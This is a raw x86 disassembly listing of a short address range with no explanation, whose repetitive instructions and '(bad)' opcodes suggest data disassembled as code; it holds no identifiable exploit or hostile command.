  441022:	dec    DWORD PTR [edi]
  441024:	sbb    eax,0x2310ff67
  441029:	fwait
  44102a:	inc    DWORD PTR [ecx]
  44102c:	add    ah,BYTE PTR [ebx+0x6e0000ff]
  441032:	inc    DWORD PTR [eax]
  441034:	add    BYTE PTR [esi-0x1],al
  441037:	add    BYTE PTR [eax],al
  441039:	daa    
  44103a:	inc    DWORD PTR [eax]
  44103c:	add    BYTE PTR [edi],dl
  44103e:	inc    DWORD PTR [eax]
  441040:	add    BYTE PTR [edi+edi*8],bl
  441043:	add    BYTE PTR [eax],al
  441045:	and    al,0xff
  441047:	add    BYTE PTR [eax],al
  441049:	and    bh,bh
  44104b:	add    BYTE PTR [eax],al
  44104d:	and    bh,bh
  44104f:	add    BYTE PTR [eax],al
  441051:	sbb    edi,edi
  441053:	add    BYTE PTR [eax],al
  441055:	sbb    edi,edi
  441057:	add    BYTE PTR [eax],al
  441059:	sbb    bh,bh
  44105b:	add    BYTE PTR [eax],al
  44105d:	sbb    eax,0x160000ff
  441062:	inc    DWORD PTR [eax]
  441064:	add    BYTE PTR [edi+edi*8],bl
  441067:	add    BYTE PTR [eax],al
  441069:	pop    ds
  44106a:	inc    DWORD PTR [eax]
  44106c:	add    BYTE PTR [edx],dh
  44106e:	inc    DWORD PTR [eax]
  441070:	add    BYTE PTR [esi-0x1],dl
  441073:	add    BYTE PTR [eax],al
  441075:	mov    bh,bh
  441077:	add    DWORD PTR [eax],edx
  441079:	int    0xff
  44107b:	sbb    eax,0x26fff246
  441080:	cmp    BYTE PTR [edi+edi*8+0x14],dh
  441084:	push   cs
  441085:	sub    edi,edi
  441087:	sbb    BYTE PTR [edi],cl
  441089:	sub    bh,bh
  44108b:	sbb    eax,0x25ff2d1e
  441090:	aaa    
  441091:	jp     0x441092
  441093:	adc    DWORD PTR ds:0x1303ffd0,ebp
  441099:	(bad)  
  44109b:	add    BYTE PTR [ecx],al
  44109d:	(bad)  
  4410a0:	add    bl,al
  4410a2:	inc    DWORD PTR [eax]
  4410a4:	add    BYTE PTR [ebp-0x41f8ff01],bh
  4410aa:	inc    DWORD PTR [ebx]
  4410ac:	sbb    esp,edx
  4410ae:	inc    DWORD PTR [ecx]
  4410b0:	add    DWORD PTR [ecx+0x5e0000ff],ebx
  4410b6:	inc    DWORD PTR [eax]
  4410b8:	add    BYTE PTR [ecx-0x1],al
  4410bb:	add    BYTE PTR [eax],al
  4410bd:	sub    eax,0x1b0000ff
  4410c2:	inc    DWORD PTR [eax]
  4410c4:	add    BYTE PTR [ecx],bl
  4410c6:	inc    DWORD PTR [eax]
  4410c8:	add    BYTE PTR [edi+edi*8],dl
  4410cb:	add    BYTE PTR [eax],al
  4410cd:	adc    edi,edi
  4410cf:	add    BYTE PTR [eax],al
  4410d1:	adc    bh,bh
  4410d3:	add    BYTE PTR [eax],al
  4410d5:	push   ss
  4410d6:	inc    DWORD PTR [eax]
  4410d8:	add    BYTE PTR [ecx],bl
  4410da:	inc    DWORD PTR [eax]
  4410dc:	add    BYTE PTR [edi+edi*8],dl
  4410df:	add    BYTE PTR [eax],al
  4410e1:	sbb    bh,bh
  4410e3:	add    BYTE PTR [eax],al
  4410e5:	sbb    bh,bh
  4410e7:	add    BYTE PTR [eax],al
  4410e9:	sub    edi,edi
  4410eb:	add    BYTE PTR [eax],al
  4410ed:	inc    esp
  4410ee:	inc    DWORD PTR [eax]
  4410f0:	add    BYTE PTR [ebp-0x1],ch
  4410f3:	add    BYTE PTR [esi],al
  4410f5:	sar    edi,0x3
  4410f8:	sbb    esp,edx
  4410fa:	call   DWORD PTR [edx]
  4410fc:	adc    DWORD PTR [ebx-0x1],ecx
  4410ff:	or     eax,0x8ff4410
  441104:	or     bl,BYTE PTR [esi]
  441106:	dec    DWORD PTR [ebx]
  441108:	adc    BYTE PTR [edi-0x1],al
  44110b:	adc    BYTE PTR [edi],bl
  44110d:	pop    ebx
  44110e:	call   DWORD PTR ds:0x2ff461a
  441114:	add    ebp,DWORD PTR [edi+edi*8-0x3ef2fe]
  44111b:	or     eax,0xdff4e1f
  441120:	sbb    DWORD PTR [edx-0x1],ecx
  441123:	adc    BYTE PTR [esi],dl
  441125:	push   ebx
  441126:	dec    DWORD PTR [ebx]
  441128:	add    esp,DWORD PTR [esi]
  44112a:	jmp    DWORD PTR [ecx]
  44112c:	cmp    ah,dl
  44112e:	call   DWORD PTR [esi]
  441130:	aaa    
  441131:	cld    
  441132:	inc    DWORD PTR [eax]
  441134:	add    BYTE PTR [edx+0x610000ff],bl
  44113a:	inc    DWORD PTR [eax]
  44113c:	add    BYTE PTR [eax],bh
  44113e:	inc    DWORD PTR [eax]
  441140:	add    BYTE PTR ds:0x70000ff,bl
  441146:	inc    DWORD PTR [eax]
  441148:	add    BYTE PTR [edx],cl
  44114a:	inc    DWORD PTR [eax]
  44114c:	add    BYTE PTR [edi+edi*8],cl
  44114f:	add    BYTE PTR [eax],al
  441151:	ud0    eax,DWORD PTR [eax]
  441154:	add    BYTE PTR ds:0x3a0000ff,bl
  44115a:	inc    DWORD PTR [eax]
  44115c:	add    BYTE PTR [esi-0x1],ah
  44115f:	add    BYTE PTR [eax],al
  441161:	popf   
  441162:	dec    DWORD PTR [ecx]
  441164:	push   es
  441165:	mov    dl,0xff
  441167:	and    eax,0x28ff661a
  44116c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  44116e:	jmp    FWORD PTR [ecx]
  441170:	dec    esp
  441171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441172:	call   FWORD PTR ds:0x1cffb243
  441178:	cmp    ebx,DWORD PTR [esi-0x70c1df01]
  44117e:	call   FWORD PTR ds:0x1dff9d1a
  441184:	and    BYTE PTR [esi+0x3d313cff],bl
  44118a:	jmp    DWORD PTR ds:0x13ff4d1e
  441190:	push   cs
  441191:	and    edi,edi
  441193:	adc    al,0x1f
  441195:	je     0x441196
  441197:	add    BYTE PTR [edx],bl
  441199:	cld    
  44119a:	dec    DWORD PTR ds:0xffb614
  4411a0:	add    BYTE PTR [edx+0x560000ff],cl
  4411a6:	inc    DWORD PTR [eax]
  4411a8:	add    BYTE PTR [ebx],dh
  4411aa:	inc    DWORD PTR [eax]
  4411ac:	add    BYTE PTR [edi],dl
  4411ae:	inc    DWORD PTR [eax]
  4411b0:	add    BYTE PTR [edi],cl
  4411b2:	inc    DWORD PTR [eax]
  4411b4:	add    BYTE PTR [esi],cl
  4411b6:	inc    DWORD PTR [eax]
  4411b8:	add    BYTE PTR [ebx],dl
  4411ba:	inc    DWORD PTR [eax]
  4411bc:	add    BYTE PTR [ebx],dl
  4411be:	inc    DWORD PTR [eax]
  4411c0:	add    BYTE PTR [ebx],dl
  4411c2:	inc    DWORD PTR [eax]
  4411c4:	add    BYTE PTR [esi],bl
  4411c6:	inc    DWORD PTR [eax]
  4411c8:	add    BYTE PTR [edi+edi*8],ch
  4411cb:	add    BYTE PTR [eax],al
  4411cd:	inc    eax
  4411ce:	inc    DWORD PTR [eax]
  4411d0:	add    BYTE PTR [ecx-0x1],ah
  4411d3:	add    BYTE PTR [eax],al
  4411d5:	mov    bh,bh
  4411d7:	add    cl,BYTE PTR [ebx]
  4411d9:	sar    edi,0x6
  4411dc:	push   ds
  4411dd:	(bad)  
  4411de:	call   DWORD PTR ds:0x1eff8f1d
  4411e4:	adc    esi,DWORD PTR [ebx]
  4411e6:	jmp    DWORD PTR [esi]
  4411e8:	sbb    esi,DWORD PTR [edx]
  4411ea:	jmp    DWORD PTR ds:0xdff4a21
  4411f0:	push   cs
  4411f1:	inc    esp
  4411f2:	jmp    FWORD PTR [ecx]
  4411f4:	and    al,0x4f
  4411f6:	jmp    FWORD PTR [ebx]
  4411f8:	and    eax,0x1411ff41
  4411fd:	arpl   di,di
  4411ff:	add    BYTE PTR [eax],al
  441201:	jnp    0x441202
  441203:	pop    es
  441204:	je     0x6c733f09
  44120a:	jmp    DWORD PTR ds:0x10ff4b23
  441210:	adc    DWORD PTR [edi+edi*8],edi
  441213:	or     al,0xa
  441215:	sub    edi,edi
  441217:	or     al,0xf
  441219:	aas    
  44121a:	call   DWORD PTR [edi]
  44121c:	sbb    eax,0x150bff61
  441221:	pop    eax
  441222:	dec    DWORD PTR [eax]
  441224:	adc    cl,BYTE PTR [edi+edi*8+0xc]
  441228:	push   ds
  441229:	mov    esi,0xa20100ff
  44122e:	inc    DWORD PTR [eax]
  441230:	add    BYTE PTR [ecx-0x1],ch
  441233:	add    BYTE PTR [eax],al
  441235:	cmp    eax,0x280000ff
  44123a:	inc    DWORD PTR [eax]
  44123c:	add    BYTE PTR [edi+edi*8],bl
  44123f:	add    BYTE PTR [eax],al
  441241:	push   ss
  441242:	inc    DWORD PTR [eax]
  441244:	add    BYTE PTR [eax],bl
  441246:	inc    DWORD PTR [eax]
  441248:	add    BYTE PTR [edi+edi*8],bl
  44124b:	add    BYTE PTR [eax],al
  44124d:	and    edi,edi
  44124f:	add    BYTE PTR [eax],al
  441251:	and    edi,edi
  441253:	add    BYTE PTR [eax],al
  441255:	sbb    edi,edi
  441257:	add    BYTE PTR [eax],al
  441259:	sbb    edi,edi
  44125b:	add    BYTE PTR [eax],al
  44125d:	sbb    edi,edi
  44125f:	add    BYTE PTR [eax],al
  441261:	adc    al,0xff
  441263:	add    BYTE PTR [eax],al
  441265:	sbb    bh,bh
  441267:	add    BYTE PTR [eax],al
  441269:	sbb    edi,edi
  44126b:	add    BYTE PTR [eax],al
  44126d:	cmp    edi,edi
  44126f:	add    BYTE PTR [eax],al
  441271:	pop    ecx
  441272:	inc    DWORD PTR [eax]
  441274:	add    BYTE PTR [esi-0x3ef3ff01],cl
  44127a:	call   FWORD PTR ds:0x18ffef40
  441280:	sub    ch,BYTE PTR [edi+edi*8+0xc]
  441284:	push   cs
  441285:	notrack call DWORD PTR [ecx]
  441288:	sbb    BYTE PTR [edx-0x1],cl
  44128b:	or     eax,0x9ff3611
  441290:	add    eax,0xb0cff08
  441295:	sbb    bh,bh
  441297:	adc    DWORD PTR [esi],esp
  441299:	xchg   edi,eax
  44129a:	inc    DWORD PTR ds:0xffea1f
  4412a0:	add    cl,cl
  4412a2:	inc    DWORD PTR [eax]
  4412a4:	add    BYTE PTR [edi-0x63ffff01],dh
  4412aa:	inc    DWORD PTR [eax]
  4412ac:	add    ebx,DWORD PTR [ecx+0x660000ff]
  4412b2:	inc    DWORD PTR [eax]
  4412b4:	add    BYTE PTR [eax-0x1],cl
  4412b7:	add    BYTE PTR [eax],al
  4412b9:	xor    edi,edi
  4412bb:	add    BYTE PTR [eax],al
  4412bd:	daa    
  4412be:	inc    DWORD PTR [eax]
  4412c0:	add    BYTE PTR [ecx],bl
  4412c2:	inc    DWORD PTR [eax]
  4412c4:	add    BYTE PTR [ecx],bl
  4412c6:	inc    DWORD PTR [eax]
  4412c8:	add    BYTE PTR [edx],dl
  4412ca:	inc    DWORD PTR [eax]
  4412cc:	add    BYTE PTR [edx],dl
  4412ce:	inc    DWORD PTR [eax]
  4412d0:	add    BYTE PTR ds:0x130000ff,cl
  4412d6:	inc    DWORD PTR [eax]
  4412d8:	add    BYTE PTR [eax],bl
  4412da:	inc    DWORD PTR [eax]
  4412dc:	add    BYTE PTR [edi+edi*8],cl
  4412df:	add    BYTE PTR [eax],al
  4412e1:	sbb    edi,edi
  4412e3:	add    BYTE PTR [eax],al
  4412e5:	adc    edi,edi
  4412e7:	add    BYTE PTR [eax],al
  4412e9:	sub    edi,edi
  4412eb:	add    BYTE PTR [eax],al
  4412ed:	inc    esp
  4412ee:	inc    DWORD PTR [eax]
  4412f0:	add    BYTE PTR [edi-0x1],ch
  4412f3:	add    BYTE PTR [esi],al
  4412f5:	ret    0xbff
  4412f8:	adc    esi,DWORD PTR [edi+edi*8+0x16]
  4412fc:	sbb    BYTE PTR [edx],ch
  4412fe:	dec    DWORD PTR [edi]
  441300:	adc    ecx,DWORD PTR [edi+edi*8+0x11]
  441304:	sbb    ebx,DWORD PTR [ebp-0x1]
  441307:	push   es
  441308:	or     esi,DWORD PTR [esi]
  44130a:	call   FWORD PTR [ebx]
  44130c:	sbb    bh,BYTE PTR [edi]
  44130e:	jmp    DWORD PTR [edi]
  441310:	sub    BYTE PTR [eax-0x1],cl
  441313:	sbb    bl,BYTE PTR [esp+edx*1]
  441316:	inc    DWORD PTR [eax]
  441318:	add    cl,al
  44131a:	dec    DWORD PTR [ebx+eiz*1]
  44131d:	fdiv   st(7),st
  44131f:	movntps XMMWORD PTR [ebp-0x1],xmm4
  441323:	or     BYTE PTR [edx],al
  441325:	push   ss
  441326:	call   DWORD PTR [ecx]
  441328:	add    BYTE PTR [edi],cl
  44132a:	jmp    DWORD PTR ds:0x17ffc63d
  441330:	dec    ecx
  441331:	std    
  441332:	inc    DWORD PTR [eax]
  441334:	add    BYTE PTR [edx+0x620000ff],bl
  44133a:	inc    DWORD PTR [eax]
  44133c:	add    BYTE PTR [esi],dh
  44133e:	inc    DWORD PTR [eax]
  441340:	add    BYTE PTR [ecx],bl
  441342:	inc    DWORD PTR [eax]
  441344:	add    BYTE PTR [ebx],cl
  441346:	inc    DWORD PTR [eax]
  441348:	add    BYTE PTR [ecx],cl
  44134a:	inc    DWORD PTR [eax]
  44134c:	add    BYTE PTR [edx],cl
  44134e:	inc    DWORD PTR [eax]
  441350:	add    BYTE PTR [edx],dl
  441352:	inc    DWORD PTR [eax]
  441354:	add    BYTE PTR [eax],ah
  441356:	inc    DWORD PTR [eax]
  441358:	add    BYTE PTR [ebx],bh
  44135a:	inc    DWORD PTR [eax]
  44135c:	add    BYTE PTR [esi-0x1],ah
  44135f:	add    BYTE PTR [eax],al
  441361:	fwait
  441362:	inc    DWORD PTR [edx]
  441364:	add    ah,cl
  441366:	jmp    DWORD PTR [esi]
  441368:	sbb    al,0x2a
  44136a:	jmp    DWORD PTR [esi]
  44136c:	das    
  44136d:	push   esi
  44136e:	call   DWORD PTR [ebx]
  441370:	lods   al,BYTE PTR ss:[esi]
  441372:	call   DWORD PTR [ebx]
  441374:	xor    DWORD PTR [ebx-0x76d5ee01],edx
  44137a:	jmp    DWORD PTR [eax]
  44137c:	ds cwde 
  44137e:	push   DWORD PTR [eax*2+0x1104ff67]
  441385:	sar    edi,cl
  441387:	sub    BYTE PTR [ebx+edi*4],ch
  44138a:	inc    DWORD PTR [ebp+0x35]
  44138d:	dec    ebx
  44138e:	call   FWORD PTR [edx]
  441390:	sbb    DWORD PTR [edi-0x1],ecx
  441393:	push   ds
  441394:	and    DWORD PTR [ebp-0x1],eax
  441397:	adc    eax,0xffc518
  44139c:	add    ch,ah
  44139e:	inc    DWORD PTR [eax]
  4413a0:	add    BYTE PTR [edi+0x5c0000ff],cl
  4413a6:	inc    DWORD PTR [eax]
  4413a8:	add    BYTE PTR [ebx],dh
  4413aa:	inc    DWORD PTR [eax]
  4413ac:	add    BYTE PTR [esi],bl
  4413ae:	inc    DWORD PTR [eax]
  4413b0:	add    BYTE PTR ds:0x120000ff,dl
  4413b6:	inc    DWORD PTR [eax]
  4413b8:	add    BYTE PTR [ecx],dl
  4413ba:	inc    DWORD PTR [eax]
  4413bc:	add    BYTE PTR [edi+edi*8],dl
  4413bf:	add    BYTE PTR [eax],al
  4413c1:	adc    al,0xff
  4413c3:	add    BYTE PTR [eax],al
  4413c5:	sbb    bh,bh
  4413c7:	add    BYTE PTR [eax],al
  4413c9:	pop    ds
  4413ca:	inc    DWORD PTR [eax]
  4413cc:	add    BYTE PTR ds:0x3f0000ff,ch
  4413d2:	inc    DWORD PTR [eax]
  4413d4:	add    BYTE PTR [edi+edi*8+0x0],bl
  4413d8:	add    BYTE PTR [edi+edi*8-0x47f8ff],al
  4413df:	add    edx,DWORD PTR [edi]
  4413e1:	fdivp  st(7),st
  4413e3:	adc    ebx,DWORD PTR [edi+ebx*4]
  4413e6:	call   FWORD PTR ds:0x1cff3915
  4413ec:	adc    ebx,DWORD PTR [edx]
  4413ee:	jmp    DWORD PTR ds:0x1fff3420
  4413f4:	sbb    DWORD PTR [eax],esi
  4413f6:	call   FWORD PTR [ecx]
  4413f8:	push   ss
  4413f9:	xor    bh,bh
  4413fb:	and    DWORD PTR [esi],ebx
  4413fd:	cmp    edi,edi
  4413ff:	sbb    bl,BYTE PTR [edi+ecx*2]
  441402:	call   DWORD PTR ds:0x17ff3910
  441408:	adc    DWORD PTR [edi+edi*8],ebp
  44140b:	push   cs
  44140c:	or     al,0x28
  44140e:	inc    DWORD PTR [eax]
  441410:	add    BYTE PTR [edx],ch
  441412:	call   DWORD PTR [ecx]
  441414:	adc    BYTE PTR [edi+edi*8+0x1f],al
  441418:	sbb    BYTE PTR [ebp-0x1],al
  44141b:	adc    eax,0xdff551a
  441420:	adc    BYTE PTR [edi-0x1],cl
  441423:	or     BYTE PTR [ecx],cl
  441425:	cmp    eax,0xe50901ff
  44142a:	inc    DWORD PTR [eax]
  44142c:	add    BYTE PTR [edi+0x680000ff],bl
  441432:	inc    DWORD PTR [eax]
  441434:	add    BYTE PTR [esi],bh
  441436:	inc    DWORD PTR [eax]
  441438:	add    BYTE PTR [edi+edi*8],ah
  44143b:	add    BYTE PTR [eax],al
  44143d:	sbb    edi,edi
  44143f:	add    BYTE PTR [eax],al
  441441:	sbb    bh,bh
  441443:	add    BYTE PTR [eax],al
  441445:	adc    edi,edi
  441447:	add    BYTE PTR [eax],al
  441449:	adc    eax,0xe0000ff
  44144e:	inc    DWORD PTR [eax]
  441450:	add    BYTE PTR [ecx],bl
  441452:	inc    DWORD PTR [eax]
  441454:	add    BYTE PTR ds:0x170000ff,bl
  44145a:	inc    DWORD PTR [eax]
  44145c:	add    BYTE PTR [edi+edi*8],bl
  44145f:	add    BYTE PTR [eax],al
  441461:	sbb    bh,bh
  441463:	add    BYTE PTR [eax],al
  441465:	sbb    edi,edi
  441467:	add    BYTE PTR [eax],al
  441469:	sub    edi,edi
  44146b:	add    BYTE PTR [eax],al
  44146d:	aas    
  44146e:	inc    DWORD PTR [eax]
  441470:	add    BYTE PTR [eax-0x1],ah
  441473:	add    BYTE PTR [eax],al
  441475:	xchg   ebp,eax
  441476:	inc    DWORD PTR [eax]
  441478:	adc    al,0xd5
  44147a:	call   DWORD PTR [ebx]
  44147c:	das    
  44147d:	out    0xff,al
  44147f:	push   ss
  441480:	and    al,0x61
  441482:	dec    DWORD PTR ds:0xfff4112
  441488:	sbb    DWORD PTR [ebp-0x1],ecx
  44148b:	adc    bl,BYTE PTR [edx+edx*2]
  44148e:	dec    DWORD PTR ds:0x9ff3a14
  441494:	or     esp,DWORD PTR [eax]
  441496:	dec    DWORD PTR [ebx]
  441498:	or     eax,DWORD PTR [ecx]
  44149a:	dec    DWORD PTR [ecx+edx*1]
  44149d:	push   eax
  44149e:	inc    DWORD PTR [eax]
  4414a0:	add    al,cl
  4414a2:	inc    DWORD PTR [eax]
  4414a4:	add    dl,dl
  4414a6:	inc    DWORD PTR [eax]
  4414a8:	add    BYTE PTR [edi+edi*8-0x8a0000],bl
  4414af:	add    BYTE PTR [eax],al
  4414b1:	push   ebp
  4414b2:	inc    DWORD PTR [eax]
  4414b4:	add    BYTE PTR [edx],bh
  4414b6:	inc    DWORD PTR [eax]
  4414b8:	add    BYTE PTR [edi+edi*8],ch
  4414bb:	add    BYTE PTR [eax],al
  4414bd:	sbb    edi,edi
  4414bf:	add    BYTE PTR [eax],al
  4414c1:	sbb    edi,edi
  4414c3:	add    BYTE PTR [eax],al
  4414c5:	adc    eax,0x120000ff
  4414ca:	inc    DWORD PTR [eax]
  4414cc:	add    BYTE PTR [ecx],dl
  4414ce:	inc    DWORD PTR [eax]
  4414d0:	add    BYTE PTR ds:0x130000ff,dl
  4414d6:	inc    DWORD PTR [eax]
  4414d8:	add    BYTE PTR [edi+edi*8],bl
  4414db:	add    BYTE PTR [eax],al
  4414dd:	adc    al,0xff
  4414df:	add    BYTE PTR [eax],al
  4414e1:	sbb    bh,bh
  4414e3:	add    BYTE PTR [eax],al
  4414e5:	ud0    eax,DWORD PTR [eax]
  4414e8:	add    BYTE PTR ds:0x430000ff,ah
  4414ee:	inc    DWORD PTR [eax]
  4414f0:	add    BYTE PTR [edi+edi*8+0x0],dh
  4414f4:	add    eax,0x110dffc3
  4414f9:	call   DWORD PTR fs:[esp+edx*1]
  4414fd:	sub    edi,edi
  4414ff:	or     eax,0x11ff5b18
  441504:	pop    ss
  441505:	dec    ebx
  441506:	dec    DWORD PTR [ecx]
  441508:	or     dh,BYTE PTR ds:0x270a09ff
  44150e:	jmp    DWORD PTR [ecx]
  441510:	and    DWORD PTR [ebp-0x1],ecx
  441513:	and    esp,DWORD PTR [ecx]
  441515:	xor    edi,edi
  441517:	or     al,0x11
  441519:	pop    ecx
  44151a:	inc    DWORD PTR [eax]
  44151c:	add    edx,edi
  44151e:	inc    DWORD PTR [eax+edx*1]
  441521:	sar    bh,1
  441523:	adc    eax,0x10ff4720
  441528:	add    DWORD PTR [eax],ecx
  44152a:	jmp    DWORD PTR [esi]
  44152c:	inc    edx
  44152d:	scas   eax,DWORD PTR es:[edi]
  44152e:	call   DWORD PTR [esi]
  441530:	xor    ah,bh
  441532:	inc    DWORD PTR [eax]
  441534:	add    BYTE PTR [eax+0x600000ff],bl
  44153a:	inc    DWORD PTR [eax]
  44153c:	add    BYTE PTR [edi],dh
  44153e:	inc    DWORD PTR [eax]
  441540:	add    BYTE PTR [ecx],bl
  441542:	inc    DWORD PTR [eax]
  441544:	add    BYTE PTR [ebx],cl
  441546:	inc    DWORD PTR [eax]
  441548:	add    BYTE PTR [ecx],cl
  44154a:	inc    DWORD PTR [eax]
  44154c:	add    BYTE PTR [edx],cl
  44154e:	inc    DWORD PTR [eax]
  441550:	add    BYTE PTR [edi],cl
  441552:	inc    DWORD PTR [eax]
  441554:	add    BYTE PTR [edx],ah
  441556:	inc    DWORD PTR [eax]
  441558:	add    BYTE PTR ds:0x690000ff,bh
  44155e:	inc    DWORD PTR [eax]
  441560:	add    BYTE PTR [ebp-0x2dffff01],bl
  441566:	jmp    FWORD PTR [edx]
  441568:	and    al,0x69
  44156a:	jmp    DWORD PTR [esi]
  44156c:	xor    dh,BYTE PTR [edi-0x1]
  44156f:	adc    eax,0x1bffb53a
  441574:	ds mov bh,0xff
  441577:	adc    al,0x33
  441579:	test   eax,0x964227ff
  44157e:	jmp    FWORD PTR [esi]
  441580:	dec    edi
  441581:	xchg   edx,eax
  441582:	(bad)  
  441583:	cmp    eax,0xff4a3b
  441588:	add    eax,0x1f23ffb3
  44158d:	sahf   
  44158e:	jmp    FWORD PTR [eax+eiz*1]
  441591:	cmp    eax,0x531d19ff
  441596:	call   FWORD PTR [ecx]
  441598:	sbb    DWORD PTR [eax-0x27fdfe01],edi
  44159e:	inc    DWORD PTR [eax]
  4415a0:	add    BYTE PTR [edx+0x610000ff],dl
  4415a6:	inc    DWORD PTR [eax]
  4415a8:	add    BYTE PTR [ecx],bh
  4415aa:	inc    DWORD PTR [eax]
  4415ac:	add    BYTE PTR [edi+edi*8],bl
  4415af:	add    BYTE PTR [eax],al
  4415b1:	adc    edi,edi
  4415b3:	add    BYTE PTR [eax],al
  4415b5:	adc    bh,bh
  4415b7:	add    BYTE PTR [eax],al
  4415b9:	adc    eax,0x110000ff
  4415be:	inc    DWORD PTR [eax]
  4415c0:	add    BYTE PTR ds:0x140000ff,cl
  4415c6:	inc    DWORD PTR [eax]
  4415c8:	add    BYTE PTR ds:0x1d0000ff,dl
  4415ce:	inc    DWORD PTR [eax]
  4415d0:	add    BYTE PTR [esi],ah
  4415d2:	inc    DWORD PTR [eax]
  4415d4:	add    BYTE PTR ds:0x570000ff,bh
  4415da:	inc    DWORD PTR [eax]
  4415dc:	add    BYTE PTR [esi-0x1],bh
  4415df:	add    DWORD PTR ds:0x1901ffb9,eax
  4415e5:	loope  0x4415e6
  4415e7:	or     BYTE PTR [edi],bl
  4415e9:	fcos   
  4415eb:	or     eax,0x19ffaf11
  4415f0:	adc    DWORD PTR [edx+0x651013ff],edx
  4415f6:	call   DWORD PTR ds:0x15ff6813
  4415fc:	adc    eax,0x1918ff65
  441601:	pop    eax
  441602:	call   FWORD PTR [esi]
  441604:	pop    ds
  441605:	call   FWORD PTR fs:[edx+eiz*1]
  441609:	pop    ebp
  44160a:	inc    DWORD PTR [edx]
  44160c:	add    esp,DWORD PTR [edi]
  44160e:	(bad)  
  44160f:	cmp    ebp,DWORD PTR [esi]
  441611:	cmp    bh,bh
  441613:	cmp    BYTE PTR [eax],dh
  441615:	sub    al,0xff
  441617:	sub    DWORD PTR [esi],esp
  441619:	cmp    bh,bh
  44161b:	sbb    ebx,DWORD PTR [ecx]
  44161d:	dec    eax
  44161e:	call   DWORD PTR [ebx]
  441620:	adc    eax,0x703ff49
  441625:	lods   al,BYTE PTR ds:[esi]
  441626:	inc    DWORD PTR [eax]
  441628:	add    cl,bh
  44162a:	inc    DWORD PTR [eax]
  44162c:	add    BYTE PTR [edx+0x5f0000ff],dl
  441632:	inc    DWORD PTR [eax]
  441634:	add    BYTE PTR ds:0x280000ff,bh
  44163a:	inc    DWORD PTR [eax]
  44163c:	add    BYTE PTR [edx],bl
  44163e:	inc    DWORD PTR [eax]
  441640:	add    BYTE PTR [ecx],bl
  441642:	inc    DWORD PTR [eax]
  441644:	add    BYTE PTR [edx],bl
  441646:	inc    DWORD PTR [eax]
  441648:	add    BYTE PTR [edi],cl
  44164a:	inc    DWORD PTR [eax]
  44164c:	add    BYTE PTR [edi],dl
  44164e:	inc    DWORD PTR [eax]
  441650:	add    BYTE PTR [ebx],dl
  441652:	inc    DWORD PTR [eax]
  441654:	add    BYTE PTR [esi],dl
  441656:	inc    DWORD PTR [eax]
  441658:	add    BYTE PTR [edi],dl
  44165a:	inc    DWORD PTR [eax]
  44165c:	add    BYTE PTR [edi],bl
  44165e:	inc    DWORD PTR [eax]
  441660:	add    BYTE PTR [ecx],bl
  441662:	inc    DWORD PTR [eax]
  441664:	add    BYTE PTR [ebx],dl
  441666:	inc    DWORD PTR [eax]
  441668:	add    BYTE PTR [ecx],ch
  44166a:	inc    DWORD PTR [eax]
  44166c:	add    BYTE PTR [edi],bh
  44166e:	inc    DWORD PTR [eax]
  441670:	add    BYTE PTR [edi-0x1],bl
  441673:	add    BYTE PTR [ecx],al
  441675:	sahf   
  441676:	inc    DWORD PTR [edx]
  441678:	es idiv edi
  44167b:	or     al,0x2a
  44167d:	(bad)  
  44167f:	adc    eax,0xcff6021
  441684:	adc    bh,BYTE PTR ds:0x3b130dff
  44168a:	dec    DWORD PTR ds:0xdff4119
  441690:	adc    dh,BYTE PTR [esi]
  441692:	dec    DWORD PTR [ebx]
  441694:	adc    al,0x34
  441696:	dec    DWORD PTR [esi+edx*1]
  441699:	cmp    edi,edi
  44169b:	or     edx,DWORD PTR [ecx]
  44169d:	push   ss
  44169e:	dec    DWORD PTR [ebx]
  4416a0:	adc    DWORD PTR [edi+edi*8],esi
  4416a3:	add    BYTE PTR [eax],al
  4416a5:	sar    edi,1
  4416a7:	add    BYTE PTR [eax],al
  4416a9:	(bad)  
  4416aa:	inc    DWORD PTR [eax]
  4416ac:	add    BYTE PTR [eax-0x1],bh
  4416af:	add    BYTE PTR [eax],al
  4416b1:	push   esp
  4416b2:	inc    DWORD PTR [eax]
  4416b4:	add    BYTE PTR [ecx],dh
  4416b6:	inc    DWORD PTR [eax]
  4416b8:	add    BYTE PTR ds:0x170000ff,ah
  4416be:	inc    DWORD PTR [eax]
  4416c0:	add    BYTE PTR [edi],dl
  4416c2:	inc    DWORD PTR [eax]
  4416c4:	add    BYTE PTR [edx],dl
  4416c6:	inc    DWORD PTR [eax]
  4416c8:	add    BYTE PTR [esi],cl
  4416ca:	inc    DWORD PTR [eax]
  4416cc:	add    BYTE PTR [ebx],dl
  4416ce:	inc    DWORD PTR [eax]
  4416d0:	add    BYTE PTR [ebx],dl
  4416d2:	inc    DWORD PTR [eax]
  4416d4:	add    BYTE PTR [edx],dl
  4416d6:	inc    DWORD PTR [eax]
  4416d8:	add    BYTE PTR [edi],cl
  4416da:	inc    DWORD PTR [eax]
  4416dc:	add    BYTE PTR [edi+edi*8],dl
  4416df:	add    BYTE PTR [eax],al
  4416e1:	or     eax,0x120000ff
  4416e6:	inc    DWORD PTR [eax]
  4416e8:	add    BYTE PTR [esi],ah
  4416ea:	inc    DWORD PTR [eax]
  4416ec:	add    BYTE PTR [edi+edi*8+0x0],al
  4416f0:	add    BYTE PTR [ebp-0x1],dh
  4416f3:	add    BYTE PTR ds:0x1611ffc6,al
  4416f9:	je     0x4416fa
  4416fb:	adc    al,0x17
  4416fd:	xor    edi,edi
  4416ff:	or     dl,BYTE PTR [eax]
  441701:	dec    edx
  441702:	dec    DWORD PTR [edi]
  441704:	adc    al,BYTE PTR [edi+edi*8+0x7]
  441708:	or     ch,BYTE PTR [edi+edi*8]
  44170b:	pop    es
  44170c:	or     DWORD PTR [ebx],esp
  44170e:	call   DWORD PTR [esp+edx*1]
  441711:	xor    bh,bh
  441713:	and    eax,0x20ff5125
  441718:	sbb    eax,0x603ff1f
  44171d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44171e:	inc    DWORD PTR [eax]
  441720:	add    bh,bh
  441722:	inc    DWORD PTR [ecx+edx*1]
  441725:	mov    ah,0xff
  441727:	sbb    BYTE PTR ds:0xc10ff06,cl
  44172d:	call   DWORD PTR gs:[eax]
  441730:	es cld 
  441732:	inc    DWORD PTR [eax]
  441734:	add    BYTE PTR [edi+0x600000ff],dl
  44173a:	inc    DWORD PTR [eax]
  44173c:	add    BYTE PTR [esi],dh
  44173e:	inc    DWORD PTR [eax]
  441740:	add    BYTE PTR [edx],bl
